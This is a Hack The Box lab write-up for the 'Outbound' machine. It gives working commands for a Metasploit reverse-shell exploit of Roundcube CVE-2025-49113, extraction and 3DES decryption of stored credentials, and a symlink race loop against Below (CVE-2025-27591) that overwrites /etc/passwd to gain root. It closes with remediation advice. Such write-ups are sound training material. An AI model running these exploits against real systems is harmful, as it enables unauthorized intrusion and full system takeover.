# Outbound — Hack The Box

![Outbound](../images/Outbound.png)

**Machine:** Outbound  
**Difficulty:** Easy  
**OS:** Linux  
**Tags:** Roundcube Webmail, CVE-2025-49113, Database Encryption, 3DES Decryption, Below Monitoring, CVE-2025-27591, Symlink Race Condition

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Initial Foothold](#initial-foothold)
4. [Lateral Movement (www-data → tyler)](#lateral-movement-www-data--tyler)
5. [Lateral Movement (tyler → jacob)](#lateral-movement-tyler--jacob)
6. [Privilege Escalation to Root](#privilege-escalation-to-root)
7. [Summary of Exploits](#summary-of-exploits)
8. [Remediation](#remediation)
9. [Tools](#tools)

---

## Summary

Outbound is an Easy Linux machine that demonstrates exploitation of Roundcube Webmail (CVE-2025-49113) to gain initial foothold, followed by database credential extraction and decryption, email reconnaissance, and privilege escalation via a symlink race condition in the Below monitoring tool (CVE-2025-27591).

**Attack Path:**  
Web enumeration → Roundcube RCE (CVE-2025-49113) → Database credential extraction → 3DES password decryption → Email reconnaissance → SSH access → Below symlink race condition (CVE-2025-27591) → Root

---

## Reconnaissance

### Port Scanning

Initial nmap scan to discover open services:

```bash
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12
80/tcp open  http    nginx 1.24.0 (Ubuntu)
||_http-title: Did not follow redirect to http://mail.outbound.htb/
```

**Key Findings:**
- SSH on port 22
- HTTP redirecting to `mail.outbound.htb`

### DNS Configuration

```bash
echo "<TARGET_IP> outbound.htb mail.outbound.htb" | sudo tee -a /etc/hosts
```

### Web Application Identification

```bash
curl -s http://mail.outbound.htb/ | grep -iE "(roundcube|webmail|version|powered|title)"
```

**Discovered:**
- **Application:** Roundcube Webmail
- **Version:** 1.6.10 (found in `"rcversion":10610`)

---

## Initial Foothold

### Vulnerability Research

```bash
searchsploit roundcube 1.6
```

**Found:** CVE-2025-49113 - Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization

### Initial Credentials

Starting credentials were provided (redacted for security):
- **Username:** `[USERNAME]` (redacted)
- **Password:** `[REDACTED_PASSWORD]`

### Metasploit Exploitation

```bash
msfconsole -q
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
set RHOSTS mail.outbound.htb
set USERNAME [USERNAME]
set PASSWORD [REDACTED_PASSWORD]
set LHOST <ATTACKER_IP>
run
```

**Result:** Meterpreter session as `www-data`

---

## Lateral Movement (www-data → tyler)

### Shell Upgrade Attempt

```bash
shell
su [USERNAME]
# Password: [REDACTED_PASSWORD]
```

**Result:** Successfully switched to user account

---

## Lateral Movement (tyler → jacob)

### Database Enumeration

Found Roundcube database credentials:

```bash
cat /var/www/html/roundcube/config/config.inc.php | grep -i "db_dsn"
```

**Credentials:**
- **User:** `[DB_USER]` (redacted)
- **Password:** `[REDACTED_DB_PASSWORD]`
- **Database:** `[DB_NAME]` (redacted)

### Session Data Extraction

```bash
mysql -u [DB_USER] -p[REDACTED_DB_PASSWORD] -h localhost [DB_NAME] -e 'SELECT * FROM session;' -E
```

**Encrypted session data found:**
- **Encrypted Password:** `[REDACTED_ENCRYPTED]`
- **Auth Secret:** `[REDACTED_SECRET]`

### Password Decryption

Found Roundcube DES key:

```bash
cat /var/www/html/roundcube/config/config.inc.php | grep -i "des_key"
```

**DES Key:** `[REDACTED_DES_KEY]`

**Decryption Method:**
- Algorithm: 3DES-CBC
- Key: `[REDACTED_DES_KEY]`
- IV: First 8 bytes of base64-decoded password

**Decrypted Password:** `[REDACTED_PASSWORD]`

### Accessing Email

Attempted to read user's mail for additional credentials:

```bash
su [USERNAME]
# Password: [REDACTED_PASSWORD]
cd /var/mail
```

**Email Content:** Email contained additional credentials (redacted)

**SSH Credentials:**
- **Username:** `[USERNAME]` (redacted)
- **Password:** `[REDACTED_PASSWORD]`

### SSH Access

```bash
ssh [USERNAME]@<TARGET_IP>
# Password: [REDACTED_PASSWORD]
```

---

## User Flag

```bash
cat ~/user.txt
# HTB{redacted}
```

✅ **User flag captured**

---

## Privilege Escalation to Root

### Sudo Enumeration

```bash
sudo -l
```

**Output:**

```
User [USERNAME] may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

**Finding:** User can run `/usr/bin/below` with any arguments except `--config`, `--debug`, or `-d` flags.

### Vulnerability: CVE-2025-27591

**Below** monitoring tool has a symlink vulnerability in `/var/log/below/` directory.

**Vulnerability Details:**
- Below creates log files with world-writable permissions (0666)
- The `/var/log/below/` directory has 0777 permissions
- Allows symlink attacks to overwrite privileged files

### Exploitation

**Created malicious payload:**

```bash
echo '[USERNAME]::0:0:root:/root:/bin/bash' > /tmp/fakepass
```

**Race condition exploit (run in background):**

```bash
while true; do
  rm -f /var/log/below/error_[USERNAME].log
  ln -s /etc/passwd /var/log/below/error_[USERNAME].log
  cp /tmp/fakepass /var/log/below/error_[USERNAME].log && break
done &
```

**Trigger Below to write as root:**

```bash
sudo /usr/bin/below snapshot --begin now
sleep 3
```

**Switch to root user:**

```bash
su [USERNAME]
# No password required
```

---

## Root Flag

```bash
whoami
# root
cat /root/root.txt
# HTB{redacted}
```

✅ **Root flag captured**

---

## Summary of Exploits

| Stage | Vulnerability | Technique | Result |
|-------|---------------|-----------|--------|
| 1 | CVE-2025-49113 | Roundcube Post-Auth RCE | www-data shell |
| 2 | Database Credentials | Config file enumeration | Database access |
| 3 | Encrypted Passwords | 3DES decryption | User password |
| 4 | Email Reconnaissance | Mail file reading | Additional credentials |
| 5 | CVE-2025-27591 | Below symlink race condition | Root access |

---

## Remediation

### Critical Security Issues

1. **CVE-2025-49113 (Roundcube RCE)**
   - Update Roundcube to version 1.6.11 or later immediately
   - Implement Web Application Firewall (WAF) rules
   - Monitor for exploitation attempts

2. **Database Credential Storage**
   - Never store database credentials in plain text
   - Use environment variables or secure key management
   - Restrict file permissions on configuration files

3. **Password Encryption**
   - Never store encryption keys in configuration files
   - Use secure key management systems
   - Implement proper key rotation policies
   - Consider using stronger encryption algorithms

4. **Email Security**
   - Encrypt sensitive emails
   - Implement proper access controls on mail files
   - Monitor for unauthorized email access

5. **CVE-2025-27591 (Below Symlink Vulnerability)**
   - Update Below monitoring tool to patched version
   - Restrict log directory permissions (remove world-writable)
   - Implement proper file permission controls
   - Use separate user accounts for monitoring tools

6. **Sudo Misconfiguration**
   - Review all sudo rules regularly
   - Avoid granting NOPASSWD for sensitive binaries
   - Use `NOEXEC` flag where applicable
   - Follow principle of least privilege

### Security Best Practices

- **Regular Updates:** Keep all software components up to date
- **Input Validation:** Validate and sanitize all user inputs
- **Principle of Least Privilege:** Review all file and sudo permissions
- **Security Monitoring:** Implement comprehensive logging and monitoring
- **Security Headers:** Add security headers to web applications
- **Code Review:** Regular security audits of application code
- **Penetration Testing:** Conduct regular security assessments

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `curl` | HTTP requests and web enumeration |
| `msfconsole` | Metasploit framework for exploitation |
| `mysql` | Database enumeration and querying |
| `CyberChef` | 3DES decryption |
| `ssh` | Remote access |
| Standard Linux utilities | File operations, symlink creation |

---

## References

- [CVE-2025-49113 - Roundcube RCE](https://github.com/hakaioffsec/CVE-2025-49113-exploit)
- [CVE-2025-27591 - Below Privilege Escalation](https://github.com/rvizx/CVE-2025-27591)
- [Roundcube Password Encryption Documentation](https://www.roundcubeforum.net/)

---

**Author:** Erviano Florentino Susanto  
**Platform:** Hack The Box  
**Difficulty:** Easy  
**Date:** Redacted  
**Flags:** User `HTB{redacted}`, Root `HTB{redacted}`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
